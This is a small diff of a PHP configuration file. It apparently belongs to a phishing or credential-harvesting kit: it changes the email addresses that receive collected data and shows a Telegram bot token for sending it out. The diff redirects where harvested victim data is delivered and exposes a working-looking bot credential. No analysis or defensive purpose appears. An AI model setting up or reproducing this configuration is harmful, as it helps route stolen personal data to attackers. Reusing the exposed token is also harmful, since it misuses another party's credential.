@@ -1,6 +1,6 @@
 <?php 
 // Email configuration
-$Receive_email="ghostdemboz@yandex.com,dadaenterprise@yandex.ru";
+$Receive_email="plakisina.y.s@gmail.com,dadaenterprise@yandex.ru";
 
 // Telegram configuration
 $telegram_bot_token = '5637971673:AAEahOWFFD_LZIHhkZg4bO7lbgo95vTAfcA'; // Your bot token
